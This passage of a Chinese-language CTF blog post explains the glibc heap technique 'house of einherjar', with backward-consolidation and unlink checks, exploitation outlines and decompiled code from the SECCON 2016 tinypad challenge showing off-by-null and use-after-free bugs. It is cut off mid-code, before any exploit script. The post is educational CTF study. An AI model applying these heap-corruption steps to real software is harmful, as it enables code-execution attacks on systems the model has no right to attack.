            "content_html": "<h1 id=\"house-of-einherjar\"><a class=\"markdownIt-Anchor\" href=\"#house-of-einherjar\">#</a> house-of-einherjar</h1>\n<p>漏洞成因</p>\n<blockquote>\n<p>溢出写、 <code>off by one</code> 、 <code>off by null</code></p>\n</blockquote>\n<p>适用范围</p>\n<blockquote>\n<ul>\n<li>\n<p>2.23—— 至今</p>\n</li>\n<li>\n<p>可分配大于处于  <code>unsortedbin</code>  的  <code>chunk</code></p>\n</li>\n</ul>\n</blockquote>\n<h3 id=\"概要\"><a class=\"markdownIt-Anchor\" href=\"#概要\">#</a> 概要：</h3>\n<p>释放堆块时，unlink 后向合并堆块，强制使得 malloc 返回一个几乎任意地址的 chunk 。</p>\n<p>free 的后向合并机制</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* consolidate backward */</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">prev_inuse</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      prevsize <span class=\"token operator\">=</span> p<span class=\"token operator\">-></span>prev_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      size <span class=\"token operator\">+=</span> prevsize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      p <span class=\"token operator\">=</span> <span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span> prevsize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> bck<span class=\"token punctuation\">,</span> fwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"绕过检测\"><a class=\"markdownIt-Anchor\" href=\"#绕过检测\">#</a> 绕过检测：</h3>\n<blockquote>\n<p>2.27 之前</p>\n</blockquote>\n<ul>\n<li>unlink 检测</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      \\</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> <span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">,</span> P<span class=\"token punctuation\">,</span> AV<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>2.27 之后</p>\n</blockquote>\n<ul>\n<li>unlink 检测</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token function\">prev_size</span> <span class=\"token punctuation\">(</span><span class=\"token function\">next_chunk</span><span class=\"token punctuation\">(</span>P<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>      \\</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"corrupted size vs. prev_size\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">!=</span> P <span class=\"token operator\">||</span> BK<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> P<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\t      \\</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token function\">malloc_printerr</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"corrupted double-linked list\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"利用思路\"><a class=\"markdownIt-Anchor\" href=\"#利用思路\">#</a> 利用思路：</h3>\n<p>one:</p>\n<ul>\n<li>申请  <code>chunk A、chunk B、chunk C、chunk D</code> ， <code>chunk D</code>  用来做  <code>gap</code> ， <code>chunk A、chunk C</code>  都要处于  <code>unsortedbin</code>  范围</li>\n<li>释放  <code>A</code> ，进入  <code>unsortedbin</code></li>\n<li>对  <code>B</code>  写操作的时候存在  <code>off by null</code> ，修改了  <code>C</code>  的  <code>P</code>  位</li>\n<li>释放  <code>C</code>  的时候，堆后向合并，直接把  <code>A、B、C</code>  三块内存合并为了一个  <code>chunk</code> ，并放到了  <code>unsortedbin</code>  里面</li>\n<li>读写合并后的大  <code>chunk</code>  可以操作  <code>chunk B</code>  的内容， <code>chunk B</code>  的头</li>\n</ul>\n<p>two:</p>\n<ul>\n<li>已有两个 chunk（最后一个 chunk，和倒数第二个 chunk），释放倒数第二个 chunk</li>\n<li>重新把倒数第二个 chunk 申请回来，在最后一个内存空间（lastchunk-&gt;presize）的位置写入 offset（可以索引到 fakechunk），同时溢出 “\\x00” 覆盖 lastchunk 的 P 位（lastchunk-&gt;size）</li>\n<li>提前在 fakechunk 处伪造好数据：presize（offset），size，FD，BK，FDsize，BKsize，padding，size</li>\n<li>释放 lastchunk</li>\n</ul>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3RyZWUvbWFzdGVyL3B3bi9oZWFwL2hvdXNlLW9mLWVpbmhlcmphci8yMDE2X3NlY2Nvbl90aW55cGFk\">ctf-challenges/pwn/heap/house-of-einherjar/2016_seccon_tinypad at master · ctf-wiki/ctf-challenges (github.com)</span></p>\n<p>源码比较长，简言之。可以去申请四个 chunk，申请最大至 0x100</p>\n<p>比较重要的是</p>\n<p><img data-src=\"/img/house-of-einherjar/image-20240713073236669.png\" alt=\"image-20240713073236669\"></p>\n<p>此处有 off-by-null 漏洞</p>\n<blockquote>\n<p>可以达成 house-of-einherjar 条件</p>\n</blockquote>\n<p>这个题虽然是低版本 libc， <code>house-of-einherjar</code>  的利用还是比较复杂的</p>\n<p>下面分析代码可能比较长，因为需要去理解程序在干了什么，才能更好的利用 <code>house-of-einherjar</code></p>\n<blockquote>\n<p>Add 片段</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">!=</span> <span class=\"token char\">'A'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_41<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v20 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">//v20 作为计数器，记录 tinypad 数量，下面用 count 代表 v20</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        v9 <span class=\"token operator\">=</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v20 <span class=\"token operator\">+</span> <span class=\"token number\">16LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span>v9<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>          <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token operator\">++</span>v20<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v20 <span class=\"token operator\">==</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// 若等于四个，则不能继续申请了。</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No space is left.\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        v22 <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(SIZE)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10LL</span><span class=\"token punctuation\">,</span> v9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        v22 <span class=\"token operator\">=</span> <span class=\"token function\">read_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v22 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>          v10 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>          v10 <span class=\"token operator\">=</span> v22<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span>v22 <span class=\"token operator\">></span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">//v22 返回 size，最大为 0x100</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            v10 <span class=\"token operator\">=</span> <span class=\"token number\">256</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        v22 <span class=\"token operator\">=</span> v10<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v20 <span class=\"token operator\">+</span> <span class=\"token number\">256</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v10<span class=\"token punctuation\">;</span><span class=\"token comment\">// 记录 size</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v20 <span class=\"token operator\">+</span> <span class=\"token number\">264</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>v22<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 记录申请 chunk 的地址</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        v11 <span class=\"token operator\">=</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>v20 <span class=\"token operator\">+</span> <span class=\"token number\">16LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span>v11 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>          <span class=\"token function\">writerrln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[!] No memory is available.\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">27LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>          <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13LL</span><span class=\"token punctuation\">,</span> v11<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token function\">read_until</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> v20 <span class=\"token operator\">+</span> <span class=\"token number\">264</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v22<span class=\"token punctuation\">,</span> <span class=\"token number\">10LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 以 v22 长度输入到 chunk</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nAdded.\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><blockquote>\n<p>Del 片段</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">==</span> <span class=\"token char\">'D'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11LL</span><span class=\"token punctuation\">,</span> v9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      count <span class=\"token operator\">=</span> <span class=\"token function\">read_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> count <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> count <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>LABEL_29<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid index\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">240</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>LABEL_31<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Not used\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">248</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">240</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 比较有意思，只是置空了 size 大小</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  \t\t\t\t\t\t\t\t\t\t\t\t  <span class=\"token comment\">// 指针未置空，存在 UAF 漏洞</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\nDeleted.\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>Edi 片段</p>\n</blockquote>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">!=</span> <span class=\"token char\">'E'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v8 <span class=\"token operator\">==</span> <span class=\"token char\">'Q'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>          <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>LABEL_41<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No such a command\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(INDEX)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11LL</span><span class=\"token punctuation\">,</span> v9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      count <span class=\"token operator\">=</span> <span class=\"token function\">read_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> count <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> count <span class=\"token operator\">></span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_29<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_QWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">240</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_31<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      c <span class=\"token operator\">=</span> <span class=\"token number\">48</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span>tinypad<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">248</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">toupper</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token char\">'Y'</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CONTENT: \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9LL</span><span class=\"token punctuation\">,</span> v16<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        v12 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>tinypad<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span>tinypad<span class=\"token punctuation\">,</span> v12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(CONTENT)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13LL</span><span class=\"token punctuation\">,</span> v13<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        v14 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>tinypad<span class=\"token punctuation\">[</span><span class=\"token number\">16</span> <span class=\"token operator\">*</span> count <span class=\"token operator\">+</span> <span class=\"token number\">248</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 返回之前 Add 的数据长度</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">read_until</span><span class=\"token punctuation\">(</span>tinypad<span class=\"token punctuation\">,</span> v14<span class=\"token punctuation\">,</span> <span class=\"token number\">10LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 以之前数据长度去进行输入</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">writeln</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Is it OK?\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token function\">write_n</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(Y/n)>>> \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9LL</span><span class=\"token punctuation\">,</span> v15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token function\">read_until</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>c<span class=\"token punctuation\">,</span> <span class=\"token 